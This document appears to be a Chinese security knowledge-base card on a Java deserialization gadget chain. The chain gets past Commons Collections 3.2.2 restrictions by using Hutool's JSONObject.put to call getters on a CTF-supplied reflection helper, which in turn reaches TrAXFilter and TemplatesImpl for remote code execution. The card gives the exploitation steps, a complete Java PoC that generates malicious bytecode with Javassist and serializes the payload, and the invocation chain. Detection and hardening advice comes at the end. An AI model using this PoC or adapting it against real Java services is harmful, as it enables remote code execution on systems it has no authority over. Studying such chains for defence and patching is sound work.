---
id: web-java-deser-commonscollections-322-jsonobject-getter-bypass
title: CC 3.2.2 禁用 Transformer 后借 Hutool JSONObject 自动调用 getter 绕过
type: scenario
domain: web
path: web/java/deserialization
technique: cc322-jsonobject-getter-constructor-gadget
tags:
- java
- deserialization
- gadget
- commons-collections
- cc322
- hutool
- jsonobject
- getter
- templatesimpl
cve: []
severity: high
confidence: medium
status: verified
affected_versions: Commons Collections 3.2.2
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:38:52+08:00'
  notes: 已对照原文（无图片）核对：CC3.2.2 的 InvokerTransformer/InstantiateTransformer readObject 调用 checkUnsafeSerialization 禁用、Myexpect 可序列化反射 getter、JSONObject.put→set→wrap→new JSONObject(value)→ObjectMapper/BeanUtil 调用 getter、ConstantTransformer(1) 先无害 put、remove 清缓存后反射替换 iConstant、再 new TrAXFilter(templates) 的 CTF 链与原文一致。已用本地 hutool-json 5.8.20 字节码确认 put→set→wrap→JSONObject(Object) 的 getter 映射路径。该链依赖应用自带反射辅助类，卡片已标 medium 并说明边界；PoC 未在目标环境执行。
url: /docs/web/java/deserialization/web-java-deser-commonscollections-322-jsonobject-getter-bypass/
draft: false
kb_aliases:
- CC 3.2.2 绕过
- Hutool JSONObject 反序列化
- getAnyexcept 链
- 可序列化 getter gadget
- JSONObject.put 触发 getter
---

## 一句话结论

当 Commons Collections 3.2.2 禁用了 `InvokerTransformer`/`InstantiateTransformer` 时，若应用类路径中存在“可序列化且 getter 会用反射调用任意构造器”的辅助类，可用 CC6 触发器把该 getter 接入链，并借 Hutool `JSONObject.put` 自动调用 getter 完成 RCE。

## 原理

- Commons Collections 3.2.2 在 `InvokerTransformer.readObject()`、`InstantiateTransformer.readObject()` 中调用 `FunctorUtils.checkUnsafeSerialization()`；默认未开启 `org.apache.commons.collections.enableUnsafeSerialization` 时反序列化即抛异常，经典 CC1/CC3/CC6 的反射 sink 全部失效。
- `ConstantTransformer` 返回常量，本身安全；但若它返回的对象在被处理时会调用危险 getter，就可把“常量”变成新的 sink。CTF 环境常提供反射工具类：例如继承 `Exception`（因而可序列化）的类，持有 `targetclass`/`typeparam`/`typearg` 字段，`getAnyexcept()` 执行 `targetclass.getConstructor(typeparam).newInstance(typearg)`。
- 触发 getter 的桥接点是 Hutool `JSONObject.put(key, value)`：在该版本中 `put` 会走 `BeanUtil.beanToMap()`，反射遍历 value 的所有 getter 并调用它们以构建 Map。于是把 `JSONObject` 作为 `LazyMap` 的底层 Map，`LazyMap.get()` 触发 `ConstantTransformer` 返回该辅助类对象后，`JSONObject.put` 会调用其 `getAnyexcept()`。
- `getAnyexcept()` 反射实例化 `TrAXFilter(Templates)`，`TrAXFilter` 构造函数内部调用 `templates.newTransformer()`，把受控 `TemplatesImpl` 送入字节码加载流程，最终执行攻击者字节码。这样反射能力来自应用自有类，而不是被禁用的 `InstantiateTransformer`。
- 完整的组合是：`HashMap.readObject → TiedMapEntry.hashCode → LazyMap.get → ConstantTransformer.transform（返回辅助类对象）→ JSONObject.put → getAnyexcept() → new TrAXFilter(templates) → TemplatesImpl.newTransformer → 字节码静态初始化 → RCE`。

## 触发条件

- 使用 Java 原生反序列化且输入可控。
- Commons Collections 为 3.2.2（危险 Transformer 被禁用），但 `LazyMap`、`ConstantTransformer`、`TiedMapEntry` 等仍可用。
- 类路径存在 Hutool（原文环境为 hutool-all 5.8.18），且 `JSONObject.put` 会反射调用 value 的 getter。
- 应用自带（或攻击者能引入）一个可序列化、getter 或 `readObject` 会执行反射调用的类；该类能解析出 `TrAXFilter` 等公开构造器并接受 `Templates` 参数。
- 目标 JDK 可访问内部 Xalan `TemplatesImpl`/`TrAXFilter`。

## 利用步骤

1. 确认 Commons Collections 版本为 3.2.2、Hutool 在类路径，并寻找可序列化的反射辅助类（关注 `getXxx()` 中的 `getConstructor`/`newInstance`/`invoke`）。
2. 用 Javassist 生成继承 `AbstractTranslet` 的恶意字节码，构造 `TemplatesImpl` 并反射设置 `_name`、`_bytecodes`。
3. 构造辅助类实例，令其 `targetclass=TrAXFilter.class`、`typeparam={Templates.class}`、`typearg={templates}`。
4. 以 `JSONObject` 为底层 Map 创建 `LazyMap`，先用无害 `ConstantTransformer` 完成 `HashMap.put` 的构造期触发。
5. 从底层 `JSONObject` 删除 key（清除 LazyMap 缓存），再反射把 `ConstantTransformer.iConstant` 替换为辅助类实例。
6. 序列化 `HashMap`，发送到目标反序列化入口。

## PoC

```java
// 依赖：commons-collections 3.2.2、hutool-all 5.8.18、javassist
// Myexpect 为题目/应用提供的可序列化反射辅助类：
//   extends Exception，字段 targetclass/typeparam/typearg
//   getAnyexcept() { return targetclass.getConstructor(typeparam).newInstance(typearg); }

public class Poc {
    public static void main(String[] args) throws Exception {
        // 1. 恶意字节码：父类必须是 AbstractTranslet，静态块执行命令
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.makeClass("EvilClass");
        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        evil.makeClassInitializer().insertBefore(
            "Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes = evil.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "1");
        setField(templates, "_bytecodes", new byte[][]{bytes});

        // 2. 用应用自带辅助类替代被禁用的 InstantiateTransformer
        Myexpect myexpect = new Myexpect();
        myexpect.setTargetclass(TrAXFilter.class);
        myexpect.setTypeparam(new Class[]{Templates.class});
        myexpect.setTypearg(new Object[]{templates});

        // 3. JSONObject 作为 LazyMap 底层 Map，put 时会调用 value 的 getter
        JSONObject jsonObject = new JSONObject();
        ConstantTransformer transformer = new ConstantTransformer(1); // 先无害
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(jsonObject, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "111");

        HashMap hashMap = new HashMap();
        hashMap.put(entry, "1");          // 构造期触发一次，返回常量 1，无危害

        // 4. 清缓存，确保反序列化时 LazyMap.get 重新 transform
        jsonObject.remove("111");

        // 5. 反射替换为真实 gadget
        setField(transformer, "iConstant", myexpect);

        byte[] payload = serialize(hashMap);
        System.out.println(Base64.getEncoder().encodeToString(payload));
    }

    static void setField(Object o, String name, Object v) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(o, v);
    }
}
```

```text
# 反序列化调用链
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get("111")
      → ConstantTransformer.transform() 返回 Myexpect
        → JSONObject.put("111", myexpect)
          → BeanUtil.beanToMap() 遍历 getter
            → Myexpect.getAnyexcept()
              → new TrAXFilter(templates)
                → templates.newTransformer()
                  → TemplatesImpl.defineTransletClasses()
                    → 恶意字节码静态初始化 → RCE
```

## 变体与关联

- 变体：任何会在序列化/反序列化过程中自动调用 getter 的组件都可作为桥接，例如 Jackson 的属性序列化、Fastjson 的 getter 调用；不限于 Hutool。
- 变体：辅助类也可以把危险逻辑放在 `readObject()` 或 `toString()` 中，而不仅限于 getter；关键是它必须可序列化且不受 CC 3.2.2 的 `checkUnsafeSerialization` 约束。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC 3.2.1 及以下的 `InstantiateTransformer` + `TrAXFilter` 经典组合，本卡是其 3.2.2 受限环境的替代方案）；[[web-java-deser-fastjson-currency-getter-expected-class]]（getter 调用作为反序列化触发面的另一案例）。
- 边界：必须存在可用的反射辅助类与 `JSONObject` 自动 getter 行为；若 Hutool 版本改变了 `put` 的实现、应用无此类工具类、或 `TemplatesImpl` 被模块封装/过滤，链路不成立。本卡置信度为 medium，原文仅给出 CTF 环境验证，未在通用环境复现。

## 检测与防御

- 检测：反序列化流量中检索 `JSONObject`、`LazyMap`、`TiedMapEntry`、`TrAXFilter`、`TemplatesImpl` 及异常类名；审计类路径中“getter 内做反射 `newInstance`/`invoke`”的工具类；监控反序列化后的类加载与 `Runtime.exec`。
- 修复：升级 Commons Collections 并保持 unsafe serialization 关闭；移除或加固应用中的反射工具类，禁止其 getter 执行任意构造器；避免使用原生 Java 反序列化。
- 加固：部署 JEP 290 `ObjectInputFilter` 白名单；对反序列化入口做认证与完整性校验；升级 JDK、限制 Xalan 内部类访问。
